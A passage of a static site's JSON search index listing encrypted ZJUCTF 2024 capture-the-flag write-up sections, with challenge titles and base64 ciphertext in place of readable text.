beginner 1 2 3"},{"location":"ctf/writeups/zjuctf2024/#minecretf-unity-edition","text":"NHA+a4R2VqsHFC4Y2IhqfQ==;osFWhj3SrxLvUgBO1pjGOtu9BKu8crslH67d/QDbpQnSP3UShOdn7dELz1aDy0NuoWi3dXWHbGUnTov9Il7qh+eG4FEBI9T61bjo/MU3X1d9gTFwaS/vNXbWK867Txj+Sw73D9UUlirQev//I/24VT7zNx9fRwwac/XB7KO63+Y=;^","title":"Minec(re)tf Unity Edition"},{"location":"ctf/writeups/zjuctf2024/#rukma","text":"3v79outbddkB0+KUT3CZ0g==;kyhoqWEwwxHu5mj/gSkAhFmz6AXkWEbZTBmxDpD2lSwHg51+iOqNEBNBdWYnS2XkrHJtN7SXZJxwexJO8597r1nQL3rJVeSIwk+o25sWbidWfgeiI3F4qMamFEy3jqV3wBTxyIvBxrjJpmDcykryuXc3pDUoWc/z8P2zyhue7h8=;^","title":"Rukma"},{"location":"ctf/writeups/zjuctf2024/#easyhap","text":"xDCESdH2dH/IsFHJM/JaUw==;l7LixRPnrsfM5dO92+uUnS4X8COKdnsNgW41YMhYUFUtX6yk20gglkVsOHFy6l0ri+XFN99TSCcBp25Ka9McYbcBzVv6fnC7o0AZJAFuyskN5/aQFzIf0wm4/VCEAVsO67b0DjC8hDqxsbRz3G7GC6yxW3VY8H0O4cJPupL0UZrVvNIcSWWYCz/R0zdFzIhSMXAiUbUrKT5E/MZDKI7ctP5qeUzjHmlvTB0ji9xilwZnNPDh/YJylGXZs1e5u+AJA1+KwMJDIM5H9jlLwumFzQjYIsfRVM5RWxC1vqwpVzm+cdYWdt0dsd8Ak2obAH7GMaxblukd51Sp5vDV8gkxGDaexS5mNkLL1moNfYKKUOYXw90CoRBEpymy6kfNnRmG7i/ZurGcMwQajkHfFt/NUtCg8eNIe7OJiDnIIkHQ1amA+CddhZoEGkF9FFrid0Gz4r4/P+qtTTQZzx8KBtQKKX6iqalgpXsfbhaaWOrt2pBCQoDMMHdGW5Epc29pEWhzOML+cljAOWfsXe2fI4Yosgwndde/U9XQYPCKVSd7juHj7oY6QarMQM3l8M3ufQe7QOAOc8rLpTdLqdmsJ9iHIMFIVFQ8xwTpsbaKnHHur/jyo2YTJQb+ZxsOfWDtukEUEPsCHPsDhrraHH7OlvNSnJj2j3k2XRrPwagr1a/5K8XXYSaHbNbLQeqL1lJKdDmVinI9+6otHtfxypFGQ+ORTrKy1Y4T/kpvHf+cOAwWtWIMk9/esTv7Fx46x6in5EXZtQiP3sUt8lmjKuo81DJgNM4S2Z9J3nBdhFeXThCSLWYpYH+vFFIg8+ekhZViYIXzhvigyjEgRiYUxqckYR1OzbMtv9n5Xy0t3AmOhF629Bbw7uOcwjkugQpyz/MR/c6NwffWk6vO93org8m/1aAut6X1EKGQLAGyyZw2fuPjas7khBatOTNrd5z2Qk+FW9Dg/FXpDLmLzoo23v5pLVyuOy4D6nQ3rKCv837oaaQs9lw499UkHeNk4uhoNVx5wXi87OrV8ngZyhsAaY2qNF7AlPX7xl2eKkOWABnfWVB6FmPa457Yr0kJv3Hwl3bbpfEMeUnJuDXZ+7olFKP48ZBc8ceFJoyvs0Nh6mQa+VfRfPMsdMvR06zWf9VTK9wqe12I;^","title":"easyhap"},{"location":"ctf/writeups/zjuctf2024/#web","text":"htoVQXNmVK7L+/J89qc3gw==;/sIifCYUfSp/jvoHlb9cVVmRnMMJlao0HtXMMTvcFpQ=;^","title":"Web"},{"location":"ctf/writeups/zjuctf2024/#easy-pentest","text":"n/cP8GV3OrY5ZCj9na7bog==;NOpk2IT1y0gzCjy3rhOr7Xwlpj33YaWM5eo3ue3Sg+yP9zvaCsWKl4NUbYfWuzK7gECAPOuh9GJiIgrVrSv9xD20jfqLVXDs5o2Vtzy7FYHE9wL4MItdzUGeyM7ND6tW7I47zWSsrDVwlrHr8qJ4rTIPInnpMCDf5m+3JoS+Z3ZIJOCdwIcutqoFBtAEWqEFXCqEvSuQprhWtNWweclbEsL/5OJzZ1BxnPtyN9Id1UkiGS30BFwSstgiIqjkrG4r8JsSJYiRTll5Vv4UAdCemsqxMXYtj4taGZDPm0gQBMH3Ru527tVZ2DWQOeHCjMlOkyK2L5woBpNYiSk2OSem4jszJz52d9DASWjd63Ebiz5baRSZJVr/SdKSEH8zwhgPSVENTrh/5wPak3FAlZIIga4HTamOph6ucl3FRAAnLvjYHwY/cLytFop5BYRYibU5lTdn//anqTkLJ9Rx8OPsnH7NNisPuFFDawfIyphSieQqjdoBL3hkfjbK6IXMROI2QSW2awQalyLphtpkuAjEWKOFYiSToXnCXAw1dWY7X3pYcW/3yi53UJq6/th4UO3nNmOASlvXmrlPixgdCkM9vobea3hsWTOiQXqI6pjZXK0kVpgPf4GPtdeAocRl4KS0ZlA7ifPxsr3/2aDHZXfFDlTOOlWA4LWf3YAPBAPwcYNu23kkSwC/ks09ypcy3bzhOAYZD0XnuuyiJyspuQMygQD+JL7hkjQ4CBjDtH79FEDBYMgOpuGPfjEE6X3bBkej2J5a25Sbp51o8QtjbvO2P4oqmykV2gg5S+HqeADfQlCJLip+Gc2uEuwsupLanOJNzAaqU+ODKN8fAf1zy3+nVpoN6261/1L5lHj243Cu5aUqnapEWSLLpO8yp60/k43NooP4wCvZv0thSvvunA3mmh8kKRSetuOheP3rfTD4/lAzGz7vA3mzqrgvbecGBDHgEpBF9cq8FzCsIxakLxc3p5ML28ZPRpmfUQZacdBsQIKOvNjwQ0dI3WCqitDjACLb6fQUnLKgh9ler7syMJvND0J+UgSuzF4oA7WFVzmWjGs=;^","title":"easy Pentest"},{"location":"ctf/writeups/zjuctf2024/#easy-jwt","text":"/rNufxyBFrO8VGHQ8Bj9pQ==;7Nh1gQvpqM9+npRbbnd+jhCRcB0fzx4XRTy1Dbp6VC8JewkVf/W7O4pW+9M2dY09+iUK+4t15gKX8M0O5fIonuhmeJU3PhlnMlxxJOBKC8sIjnw7rT1pi73pOcPI5ZHhn0GbG2HJ2lyqq+aJwzf5ez8ix3ljfdLXWgcHGNTpSHRZgJYiKJFqEar+6LedhdRGKQBsKPwd8ZWQP8d2iZ6PoIHPV/3YmhwMbLOV+pOPSCdiBiX50fE48XcbJSL0/06WQo0CbDtyUOmPTVCxj7KckAii262Wm8Oo+/lf8D90PtnBWKGMrAc5AeKsbd8Un902Y+zMRU4NDsrdcQ4zQEoVdIIhjaIeyQliIPcEYD/t0LrKcbrgf0Gi3KiVjwwQ/O50NEVTWlP5k3WXn+6v47X29Q6FZN8hX6j/LwzM2A7DRWE+ICXs/QCbyGgwgp64Q93R+cZx9qhfyQg4SfAwnuAiPL0yWtbLBAvfh3CSQmGtvTWav9hMPxquF8/ZJSx86N93;^","title":"easy JWT"},{"location":"ctf/writeups/zjuctf2024/#_2","text":"nk91cQkvvxosz0Csoj4AVw==;LrXtyvpbIrHd63bzc0X5iAs+05pxMBDn66RZ8jDFqbfoyIrExMw6wc3jC16fjoPhVNnl97X74B4EsCowhU5T4OESjUPd1KW7AmbojFktkS/pLLb5likV6W+QXNsnPTm+l3y3PazQK6MDk8FRNUlak4xc+Z3nfwvQV6E1JRH8KW+9qSgLcmE4b74Y3zUDrint7yZweFd20aZ8kYm2rz92scDwVABqJiL3ckrdO9nNtryRSj8d0NHCWfZiozIsUaAU;^","title":"\u5c71\u96c0"},{"location":"ctf/writeups/zjuctf2024/#aviator","text":"z+ZHp4I6pvA14E5qyyv85A==;UEXiUXrZNXk1MsKQENPGYfq7pSsvmUV6JZGZiRPkKb0UwbKpogd/nRHYmklyHTgjdln0O5Xe/VOKGe7M4HMHsUhOz5i3ik1aj5L/pcu/1vuARG9DMc95qZd43AtqXEsuXnNuxprarbKBFmJzG2QiHOEUcKFKx7hkV6fK6JdrvYcrEd/F9GDDmWCOPHDpACOKDmO0G//Z7y4Dg9Tvm77NeNEYsxktX5emWl4Jwz542wu0KkOMremSOLw/4hQs7ElZM3Wekr+erfkJF9iKI7QC6OcKtb5jV0BtMrNvGBi3RPjTptfaC/WpJhfpmSamtL76LQPpdynd5jo6fa677prJiBxzdRjGFsYz4OMSKs5PPngycjpjw4v0nu0pzdMD3fxx;^","title":"Aviator"},{"location":"ctf/writeups/zjuctf2024/#crypto","text":"4g5Y4f8EVqXp7v0mdGehTg==;kwWtryRmWOPqegb1K2g863S0e77iZ8wXBO40FUFJ8t0=;^","title":"Crypto"},{"location":"ctf/writeups/zjuctf2024/#shad0wtime","text":"tn6LmSUvkQXVV8WMWlJ+tQ==;NJz4XXkiY+vH7HSKOgrXFwsFFAMb5oii3cPKWWHO9HAKJicTQTSorL39ZztSHS0DCDi4bbhIjRKpfzef/OXY5nT/M2yOAvQfiWWijY0Yl5uC8xKsA1rtC2fsJd8QxJWrKWlEhEfCAv9s2e06/4qFU+zEqazhmu67z0Cwn50fTSdFOBg2bPN7Z25dmgRY6Np4mr4Bljvjfwz0w3TkvaHUxPBRraKm70IQxndfCyZr8++LCcWH52Kpl6ZTGUB+hrmmbEEq2gXBZoZ1nDtI6cTK4qEYEjGDFAphPT+cbzoIpWhZTtDcLVKlq8e2wMO03lrdQaK8OJpWwZVTk4QElhwchUdVSgld38U0MiA/ALN3ZcT6vYlKcozkqhy7gTXb+oQn76JpqJ/ldgUkQpSEgAJkCshx4yJufUtVrghgEDVJySDXogfbDb7HM8Jv+rIMI0XLjKLGY+h9vKD9V9mbE59mVpFfDG/v5Liw9cZ0fGjjTE2PUY/bp7Vw1DYgveja+4zE2c5qhSbw5ekUrQeZF2vwQ1zfqr0I/1Pb5m4UZuo2otwxBGkMl/M6TWFJ9VtZpNM2XZm6DZeg/uuXH8I/GwOC6XBytU2uwGdATdbTiGWXBN8kCWsU8cqBUpORZJ8OKYldB39xHN5Ucx0a4TdZ7X1y03fnQIQt5xmYGsxcRrPMaKF3qWMnuFlw1Nefw1q6krUfAQi9DY/4pa63CzpyqTX/+1nodCQRJliWmV/5o48bFJHhzi2PMYMe0c0qe1dXQoT8Y5ZSC1faw8xQJyyrmUOShFJTPc6in7+RxX48C1HnYbmrP7u9lvIfxoLUDtbKuZcHREKX3fAQDuMBx7dEkFjooQ==;^","title":"Shad0wTime"},{"location":"ctf/writeups/zjuctf2024/#ezxor","text":"akujDj5m0zMdePn0fy+qTw==;A4YsTkUmZ9kwRtBSIH5OFYqIontVNavTJsecN43HCme6UhHRgykCsJtYeMyMRnw/JxmTuXObJBiakGE4UO0kWcv3DrjwWw8vYfjJPeFTuLcg6aJCxlIqdzyvbB61SygJcJz45g2Cends1pon8IAgEgLkpzqqOsM5LqowP+H4PhuQGj4M9Zfv5bEi+NNzltUrXo8QzlfvhvQ/YsfqvG0gdaxGwf4nbYyplWy2bU2VhV3VbFeX+ndSIyefY8pBb5MqUOxa4FyWcfUzo18Tp/FkKLN6vQyl+nKGFKg1y6DtpMD5tvq3lFzW7MKm/QFDNk9CbnHQ8NZ6OKW6Dn9RrkKWCGktwCTy1EnFUtqTil+mHG6h9V6ZLsRD6zSfO5l9l3LqWIvLuvHYF7ahpp3Gc+uejyqNR2DR4LZ8KVxj5Ko3cDF90ek4E33HxUM1+3Fd4Gqk6K6tV4QYlhbvwMiU6jBQgWdE7zp3vXeNynJvvrCgHQXoJpunL6KjwB/3ZFRt1NXqGV1Z0ynLDuw7LbGbzzaME6Id5HfZdPbR24qcw46+x1UCcCB+E0KsGXVNVwJAqQWl3zG9QaKEsdKlUnO3zW5bKjO2vdcvuPMJup3iXW9+jYWs10oEf+ncBVJqJLljsophjzsUtW/CabHYwdotigAB/7dTQepFTDrbMgG7BHrsgQdgt9p87FOUHAjgvzW99l2mFvkRcRFd5x8YxwU5GRY3pyoNZPnHAdHWAKGGNG26oEvA/F2VqgSUGgAKTFbjObTtmvDo2gKqtd7CE+/KDTfXRlwQydxpuI3132JurevSwI7rxZkXKjiMjTPA8dtEbI5jiAOsNKCnAZVeIAVEEVv3P6I8RL7IgDYtye1CZYnRkwaav7V/thGkUj/cIA6JZf7Q5tmvELkGrmKd6kCr/ki1sWAgRg6B1F3d6Y0seETQFRXoj+dnZ8qnvSI59q4q388o5Fog7OwX4KYFWAoa0nghSg==;^","title":"ezxor"},{"location":"ctf/writeups/zjuctf2024/#seed","text":"BKFSj2YQ5IfZTG8oFctFDA==;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;^","title":"Seed?"},{"location":"ctf/writeups/zjuctf2024/#pwn","text":"1jWtz2dcs0VTye+H6JZlYw==;fRn3DC+53fGDj0Mv14xBDFrZ/t2OVyoJK/W/shRt/Vo=;^","title":"Pwn"},{"location":"ctf/writeups/zjuctf2024/#simple-echo","text":"TIOCGbtQylA0G0yQ9yf8Yw==;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